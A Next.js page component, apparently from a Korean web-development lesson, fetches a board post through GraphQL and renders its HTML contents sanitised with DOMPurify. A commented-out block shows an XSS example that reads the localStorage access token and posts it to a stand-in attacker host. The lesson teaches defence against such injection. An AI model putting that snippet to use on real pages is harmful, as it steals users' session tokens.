import { gql, useQuery } from '@apollo/client';
import { useRouter } from 'next/router';
import Dompurify from 'dompurify';

const FETCH_BOARD = gql`
  query fetchBoard($boardId: ID!) {
    fetchBoard(boardId: $boardId) {
      _id
      writer
      title
      contents
    }
  }
`;

export default function StaticRoutingMovedPage(): JSX.Element {
  const router = useRouter();
  const { data } = useQuery(FETCH_BOARD, {
    variables: { boardId: Number(router.query.number) },
  });

  console.log(router);
  console.log(data);

  return (
    <div>
      {/* <div>{router.query.number}번 게시글 이동이 완료되었습니다.</div> */}
      <div>작성자 : {data?.fetchBoard?.writer}</div>
      <div>작성자 : {data?.fetchBoard?.title}</div>
      {/* <div>작성자 : {data?.fetchBoard?.contents}</div> */}
      {/* <div dangerouslySetInnerHTML={{ __html: data?.fetchBoard?.contents }} /> */}
      {/* <div dangerouslySetInnerHTML={{
        __html: `
          <script>
            const qqq = localStorage.getItem("accessToken")
            axios.post("http://myhackerbackend.com/mydata", {data: qqq})
          </script>
        `
      }} /> */}
      {typeof window !== 'undefined' && (
        <div
          dangerouslySetInnerHTML={{
            __html: Dompurify.sanitize(data?.fetchBoard.contents),
          }}></div>
      )}
    </div>
  );
}
